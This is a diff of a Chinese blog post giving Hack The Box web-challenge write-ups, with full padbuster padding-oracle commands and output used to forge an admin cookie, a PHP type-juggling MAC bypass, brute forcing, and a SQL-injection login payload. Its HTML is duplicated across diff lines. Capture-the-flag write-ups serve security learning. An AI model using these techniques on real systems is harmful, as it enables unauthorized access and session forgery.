(96/256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 3 Results:</span><br><span class="line">[+] New Cipher Text (HEX): 8a6b238e62ec8b18</span><br><span class="line">[+] Intermediate Bytes (HEX): a8194ce207ceb13a</span><br><span class="line"></span><br><span class="line">[+] Success: (203/256) [Byte 8]</span><br><span class="line">[+] Success: (77/256) [Byte 7]</span><br><span class="line">[+] Success: (130/256) [Byte 6]</span><br><span class="line">[+] Success: (12/256) [Byte 5]</span><br><span class="line">[+] Success: (6/256) [Byte 4]</span><br><span class="line">ERROR: No matching response on [Byte 3]</span><br><span class="line">       Automatically trying one more time...</span><br><span class="line">ERROR: No matching response on [Byte 8]</span><br><span class="line">Do you want to start this block over? (Yes/No)? [y/n/a] : a</span><br><span class="line">INFO: Switching to interactive mode</span><br><span class="line">[+] Success: (203/256) [Byte 8]</span><br><span class="line">Do you want to use this value (Yes/No/All)? [y/n/a] : a</span><br><span class="line">[+] Success: (77/256) [Byte 7]</span><br><span class="line">ERROR: 500 Can&apos;t connect to docker.hackthebox.eu:42414 (Connection timed out)</span><br><span class="line">   Retrying in 10 seconds...</span><br><span class="line"></span><br><span class="line">[+] Success: (130/256) [Byte 6]</span><br><span class="line">[+] Success: (176/256) [Byte 5]</span><br><span class="line">[+] Success: (129/256) [Byte 4]</span><br><span class="line">[+] Success: (80/256) [Byte 3]</span><br><span class="line">[+] Success: (53/256) [Byte 2]</span><br><span class="line">[+] Success: (14/256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 2 Results:</span><br><span class="line">[+] New Cipher Text (HEX): d8add2173d139318</span><br><span class="line">[+] Intermediate Bytes (HEX): faccb67a547db134</span><br><span class="line"></span><br><span class="line">[+] Success: (83/256) [Byte 8]</span><br><span class="line">[+] Success: (107/256) [Byte 7]</span><br><span class="line">[+] Success: (221/256) [Byte 6]</span><br><span class="line">[+] Success: (52/256) [Byte 5]</span><br><span class="line">[+] Success: (219/256) [Byte 4]</span><br><span class="line">[+] Success: (207/256) [Byte 3]</span><br><span class="line">[+] Success: (239/256) [Byte 2]</span><br><span class="line">[+] Success: (161/256) [Byte 1]</span><br><span class="line"></span><br><span class="line">Block 1 Results:</span><br><span class="line">[+] New Cipher Text (HEX): 2c344253ad52b596</span><br><span class="line">[+] Intermediate Bytes (HEX): 57163720c82097ac</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">** Finished ***</span><br><span class="line"></span><br><span class="line">[+] Encrypted value is: LDRCU61StZbYrdIXPROTGIprI45i7IsYMAovrw2IGp8AAAAAAAAAAA%3D%3D</span><br><span class="line">-------------------------------------------------------</span><br></pre></td></tr></table></figure></p>
-<p>更改iknowmag1k，得到flag，跑了3个小时（orz）</p>
-<h2 id="grammar"><a href="#grammar" class="headerlink" title="grammar"></a>grammar</h2><p>进入网页，出现403<br><img src="https://i.loli.net/2019/05/16/5cdcc23d6865468602.png" alt=""><br>用burpsuite 截获请求，改用<code>post</code>方式访问<a href="http://docker.hackthebox.eu:50101/index.php" target="_blank" rel="noopener">http://docker.hackthebox.eu:50101/index.php</a><br>得到了一个页面<br><img src="https://i.loli.net/2019/05/16/5cdcc3aa1233896306.png" alt=""><br>查看网页源码，注意到一行注释：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- HTB hint:really not important...totaly solvable without using it! Just there to fill things and to save you from some trouble you might get into :) --&gt;</span><br></pre></td></tr></table></figure></p>
-<p>所以我们去看他的请求信息会有哪些，注意到了<strong>cookie</strong>：<br><img src="https://i.loli.net/2019/05/16/5cdcc4c39a17959432.png" alt=""><br>base64解码之后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;User&quot;:&quot;admin&quot;,&quot;Admin&quot;:&quot;False&quot;,&quot;MAC&quot;:&quot;ef7bf3acf4e370f991a6342b4f57dee1&quot;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>有两个地方需要改，<code>Admin</code>和<code>MAC</code>，关键就在于<strong>MAC</strong><br>查看了他人的writeup，发现在<a href="https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf" target="_blank" rel="noopener">https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf</a> 指出了HMAC算法的问题<br><img src="https://i.loli.net/2019/05/16/5cdccefd80f4f86580.png" alt=""><br>因为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(‘aa’==0);</span><br></pre></td></tr></table></figure></p>
-<p>的结果是<strong>true</strong>,所以我们尝试构造：<br><img src="https://i.loli.net/2019/05/16/5cdcd15a867b618705.png" alt=""><br>将<strong>cookie</strong>改为上述值，则可到flag</p>
+<p>查询一番，发现是<a href="https://wenku.baidu.com/view/6dd0cacdda38376baf1faeb4.html" target="_blank" rel="noopener">padding Oracle</a><br>，准备在另一篇文章详解<br>可以利用padbuster，在kali上自带，可能是网络的原因，也可能是垃圾电脑的原因，跑了很久：</p>
+<pre><code>root@kali:~# padbuster http://docker.hackthebox.eu:42414/profile.php 82IHsQduSvpf%2BWvamiXX%2BQVO9zszmMxyl6E3mVGt%2BYxB0Szjb8Mwjg%3D%3D 8 --cookie &quot;iknowmag1k=82IHsQduSvpf%2BWvamiXX%2BQVO9zszmMxyl6E3mVGt%2BYxB0Szjb8Mwjg%3D%3D;PHPSESSID=qevph0jf0hlskfkr0atq1kj1b3&quot;
+
++-------------------------------------------+
+| PadBuster - v0.3.3                        |
+| Brian Holyfield - Gotham Digital Science  |
+| labs@gdssecurity.com                      |
++-------------------------------------------+
+
+INFO: The original request returned the following
+[+] Status: 200
+[+] Location: N/A
+[+] Content Length: 3844
+
+INFO: Starting PadBuster Decrypt Mode
+*** Starting Block 1 of 4 ***
+
+INFO: No error string was provided...starting response analysis
+
+*** Response Analysis Complete ***
+
+The following response signatures were returned:
+
+-------------------------------------------------------
+ID#    Freq    Status    Length    Location
+-------------------------------------------------------
+1    1    200    3844    N/A
+2 **    255    500    2203    N/A
+-------------------------------------------------------
+
+Enter an ID that matches the error condition
+NOTE: The ID# marked with ** is recommended : 2
+
+Continuing test with selection 2
+
+[+] Success: (63/256) [Byte 8]
+[+] Success: (150/256) [Byte 7]
+[+] Success: (129/256) [Byte 6]
+ERROR: No matching response on [Byte 5]
+       Automatically trying one more time...
+[+] Success: (223/256) [Byte 8]
+[+] Success: (10/256) [Byte 7]
+ERROR: No matching response on [Byte 6]
+Do you want to start this block over? (Yes/No)? [y/n/a] : y
+INFO: Switching to interactive mode
+[+] Success: (63/256) [Byte 8]
+Do you want to use this value (Yes/No/All)? [y/n/a] : y
+[+] Success: (150/256) [Byte 7]
+Do you want to use this value (Yes/No/All)? [y/n/a] : a
+[+] Success: (225/256) [Byte 6]
+[+] Success: (154/256) [Byte 5]
+[+] Success: (57/256) [Byte 4]
+[+] Success: (140/256) [Byte 3]
+[+] Success: (185/256) [Byte 2]
+[+] Success: (128/256) [Byte 1]
+
+Block 1 Results:
+[+] Cipher Text (HEX): 5ff96bda9a25d7f9
+[+] Intermediate Bytes (HEX): 884072c2621c68c0
+[+] Plain Text: {&quot;user&quot;:
+
+Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, &lt;STDIN&gt; line 4.
+*** Starting Block 2 of 4 ***
+
+[+] Success: (44/256) [Byte 8]
+[+] Success: (9/256) [Byte 7]
+[+] Success: (184/256) [Byte 6]
+[+] Success: (9/256) [Byte 5]
+[+] Success: (78/256) [Byte 4]
+[+] Success: (247/256) [Byte 3]
+[+] Success: (97/256) [Byte 2]
+[+] Success: (139/256) [Byte 1]
+
+Block 2 Results:
+[+] Cipher Text (HEX): 054ef73b3398cc72
+[+] Intermediate Bytes (HEX): 7d980fb7f34bf5d5
+[+] Plain Text: &quot;admin&quot;,
+
+*** Starting Block 3 of 4 ***
+
+[+] Success: (175/256) [Byte 8]
+[+] Success: (12/256) [Byte 7]
+[+] Success: (71/256) [Byte 6]
+[+] Success: (174/256) [Byte 5]
+[+] Success: (174/256) [Byte 4]
+[+] Success: (98/256) [Byte 3]
+[+] Success: (197/256) [Byte 2]
+[+] Success: (209/256) [Byte 1]
+
+Block 3 Results:
+[+] Cipher Text (HEX): 97a1379951adf98c
+[+] Intermediate Bytes (HEX): 273c985756baf650
+[+] Plain Text: &quot;role&quot;:&quot;
+
+*** Starting Block 4 of 4 ***
+
+[+] Success: (113/256) [Byte 8]
+[+] Success: (7/256) [Byte 7]
+[+] Success: (45/256) [Byte 6]
+[+] Success: (137/256) [Byte 5]
+[+] Success: (18/256) [Byte 4]
+[+] Success: (172/256) [Byte 3]
+[+] Success: (43/256) [Byte 2]
+[+] Success: (22/256) [Byte 1]
+
+Block 4 Results:
+[+] Cipher Text (HEX): 41d12ce36fc3308e
+[+] Intermediate Bytes (HEX): e2d252eb73d0fb8e
+[+] Plain Text: user&quot;}
+
+-------------------------------------------------------
+** Finished ***
+
+[+] Decrypted value (ASCII): {&quot;user&quot;:&quot;admin&quot;,&quot;role&quot;:&quot;user&quot;}
+
+[+] Decrypted value (HEX): 7B2275736572223A2261646D696E222C22726F6C65223A2275736572227D0202
+
+[+] Decrypted value (Base64): eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9AgI=
+
+-------------------------------------------------------
+</code></pre><p>所以将<strong>role</strong>改为<strong>admin</strong></p>
+<pre><code>root@kali:~# padbuster http://docker.hackthebox.eu:42414/profile.php 82IHsQduSvpf%2BWvamiXX%2BQVO9zszmMxyl6E3mVGt%2BYxB0Szjb8Mwjg%3D%3D 8 --cookie &quot;iknowmag1k=82IHsQduSvpf%2BWvamiXX%2BQVO9zszmMxyl6E3mVGt%2BYxB0Szjb8Mwjg%3D%3D;PHPSESSID=qevph0jf0hlskfkr0atq1kj1b3&quot; -plaintext &quot;{\&quot;user\&quot;:\&quot;admin\&quot;,\&quot;role\&quot;:\&quot;admin\&quot;}&quot;
+
++-------------------------------------------+
+| PadBuster - v0.3.3                        |
+| Brian Holyfield - Gotham Digital Science  |
+| labs@gdssecurity.com                      |
++-------------------------------------------+
+
+INFO: The original request returned the following
+[+] Status: 200
+[+] Location: N/A
+[+] Content Length: 3844
+
+INFO: Starting PadBuster Encrypt Mode
+[+] Number of Blocks: 4
+
+INFO: No error string was provided...starting response analysis
+
+*** Response Analysis Complete ***
+
+The following response signatures were returned:
+
+-------------------------------------------------------
+ID#    Freq    Status    Length    Location
+-------------------------------------------------------
+1    1    200    3844    N/A
+2 **    255    500    2203    N/A
+-------------------------------------------------------
+
+Enter an ID that matches the error condition
+NOTE: The ID# marked with ** is recommended : 2
+
+Continuing test with selection 2
+
+[+] Success: (97/256) [Byte 8]
+[+] Success: (155/256) [Byte 7]
+[+] Success: (87/256) [Byte 6]
+[+] Success: (153/256) [Byte 5]
+[+] Success: (61/256) [Byte 4]
+[+] Success: (188/256) [Byte 3]
+[+] Success: (151/256) [Byte 2]
+[+] Success: (167/256) [Byte 1]
+
+Block 4 Results:
+[+] New Cipher Text (HEX): 300a2faf0d881a9f
+[+] Intermediate Bytes (HEX): 516e42c663aa679e
+
+[+] Success: (197/256) [Byte 8]
+[+] Success: (77/256) [Byte 7]
+[+] Success: (51/256) [Byte 6]
+[+] Success: (253/256) [Byte 5]
+[+] Success: (25/256) [Byte 4]
+[+] Success: (182/256) [Byte 3]
+[+] Success: (226/256) [Byte 2]
+[+] Success: (96/256) [Byte 1]
+
+Block 3 Results:
+[+] New Cipher Text (HEX): 8a6b238e62ec8b18
+[+] Intermediate Bytes (HEX): a8194ce207ceb13a
+
+[+] Success: (203/256) [Byte 8]
+[+] Success: (77/256) [Byte 7]
+[+] Success: (130/256) [Byte 6]
+[+] Success: (12/256) [Byte 5]
+[+] Success: (6/256) [Byte 4]
+ERROR: No matching response on [Byte 3]
+       Automatically trying one more time...
+ERROR: No matching response on [Byte 8]
+Do you want to start this block over? (Yes/No)? [y/n/a] : a
+INFO: Switching to interactive mode
+[+] Success: (203/256) [Byte 8]
+Do you want to use this value (Yes/No/All)? [y/n/a] : a
+[+] Success: (77/256) [Byte 7]
+ERROR: 500 Can&#39;t connect to docker.hackthebox.eu:42414 (Connection timed out)
+   Retrying in 10 seconds...
+
+[+] Success: (130/256) [Byte 6]
+[+] Success: (176/256) [Byte 5]
+[+] Success: (129/256) [Byte 4]
+[+] Success: (80/256) [Byte 3]
+[+] Success: (53/256) [Byte 2]
+[+] Success: (14/256) [Byte 1]
+
+Block 2 Results:
+[+] New Cipher Text (HEX): d8add2173d139318
+[+] Intermediate Bytes (HEX): faccb67a547db134
+
+[+] Success: (83/256) [Byte 8]
+[+] Success: (107/256) [Byte 7]
+[+] Success: (221/256) [Byte 6]
+[+] Success: (52/256) [Byte 5]
+[+] Success: (219/256) [Byte 4]
+[+] Success: (207/256) [Byte 3]
+[+] Success: (239/256) [Byte 2]
+[+] Success: (161/256) [Byte 1]
+
+Block 1 Results:
+[+] New Cipher Text (HEX): 2c344253ad52b596
+[+] Intermediate Bytes (HEX): 57163720c82097ac
+
+-------------------------------------------------------
+** Finished ***
+
+[+] Encrypted value is: LDRCU61StZbYrdIXPROTGIprI45i7IsYMAovrw2IGp8AAAAAAAAAAA%3D%3D
+-------------------------------------------------------
+</code></pre><p>更改iknowmag1k，得到flag，跑了3个小时（orz）</p>
+<h2 id="grammar"><a href="#grammar" class="headerlink" title="grammar"></a>grammar</h2><p>进入网页，出现403<br><img src="https://i.loli.net/2019/05/16/5cdcc23d6865468602.png" alt=""><br>用burpsuite 截获请求，改用<code>post</code>方式访问<a href="http://docker.hackthebox.eu:50101/index.php" target="_blank" rel="noopener">http://docker.hackthebox.eu:50101/index.php</a><br>得到了一个页面<br><img src="https://i.loli.net/2019/05/16/5cdcc3aa1233896306.png" alt=""><br>查看网页源码，注意到一行注释：</p>
+<pre><code>&lt;!-- HTB hint:really not important...totaly solvable without using it! Just there to fill things and to save you from some trouble you might get into :) --&gt;
+</code></pre><p>所以我们去看他的请求信息会有哪些，注意到了<strong>cookie</strong>：<br><img src="https://i.loli.net/2019/05/16/5cdcc4c39a17959432.png" alt=""><br>base64解码之后：</p>
+<pre><code>{&quot;User&quot;:&quot;admin&quot;,&quot;Admin&quot;:&quot;False&quot;,&quot;MAC&quot;:&quot;ef7bf3acf4e370f991a6342b4f57dee1&quot;}
+</code></pre><p>有两个地方需要改，<code>Admin</code>和<code>MAC</code>，关键就在于<strong>MAC</strong><br>查看了他人的writeup，发现在<a href="https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf" target="_blank" rel="noopener">https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf</a> 指出了HMAC算法的问题<br><img src="https://i.loli.net/2019/05/16/5cdccefd80f4f86580.png" alt=""><br>因为：</p>
+<pre><code>var_dump(‘aa’==0);
+</code></pre><p>的结果是<strong>true</strong>,所以我们尝试构造：<br><img src="https://i.loli.net/2019/05/16/5cdcd15a867b618705.png" alt=""><br>将<strong>cookie</strong>改为上述值，则可到flag</p>
 <h2 id="Lernaean"><a href="#Lernaean" class="headerlink" title="Lernaean"></a>Lernaean</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180919184650-507feb54-bbf9-1.png" alt=""></p>
 <p>赤裸裸的提示爆破，于是利用burp，字典设为<strong>username</strong>，最终找到flag</p>
 <h2 id="Cartographer"><a href="#Cartographer" class="headerlink" title="Cartographer"></a>Cartographer</h2><p>用burp监测到<code>sql inject</code>，并且直接注出了页面（也可以利用万能密码：user：<code>admin&#39;/*</code> pass：<code>密码*/&#39;</code>），但是：</p>
@@ -38,4 +376,4 @@
 <p><br>Cartographer<br>Is Still<br>Under Construction!        </p>
 </blockquote>
 <p>注意到地址栏<code>panel.php?info=home</code>，将其改为flag，则读到了flag</p>
-</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-05-03</span><i class="fa fa-tag"></i><a class="tag" href="/tags/tutorial-ctf/" title="tutorial ctf">tutorial ctf </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://microvorld.com/2019/05/03/靶机/hack the box邀请码获取和web challenge/,damn1t,hack the box邀请码获取和web challenge,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2019/05/04/cve/CNVD-C-2019-48814/" title="CNVD-C-2019-48814">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2019/05/03/靶机/xss-quiz/" title="XSS Challenges">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://microvorld.com">damn1t</a></p><p> <span>Link:  </span><a href="http://microvorld.com/2019/05/03/靶机/hack the box邀请码获取和web challenge/">http://microvorld.com/2019/05/03/靶机/hack the box邀请码获取和web challenge/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/05/04/cve/CNVD-C-2019-48814/" title="CNVD-C-2019-48814"><span>< PreviousPost</span><br><span class="prevTitle">CNVD-C-2019-48814</span></a><a class="nextSlogan" href="/2019/05/03/靶机/xss-quiz/" title="XSS Challenges"><span>NextPost ></span><br><span class="nextTitle">XSS Challenges</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#hack-the-box邀请码获取和web-challenge"><span class="toc-number">1.</span> <span class="toc-text">hack the box邀请码获取和web challenge</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hack-the-box邀请码获取"><span class="toc-number">1.1.</span> <span class="toc-text">hack the box邀请码获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-challenge"><span class="toc-number">1.2.</span> <span class="toc-text">web challenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HDC"><span class="toc-number">1.2.1.</span> <span class="toc-text">HDC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#All-good-boys-are-here…-hehehehehehe"><span class="toc-number">1.3.</span> <span class="toc-text">All good boys are here… hehehehehehe!</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#I-know-Mag1k"><span class="toc-number">1.3.1.</span> <span class="toc-text">I know Mag1k</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#grammar"><span class="toc-number">1.4.</span> <span class="toc-text">grammar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lernaean"><span class="toc-number">1.5.</span> <span class="toc-text">Lernaean</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cartographer"><span class="toc-number">1.6.</span> <span class="toc-text">Cartographer</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
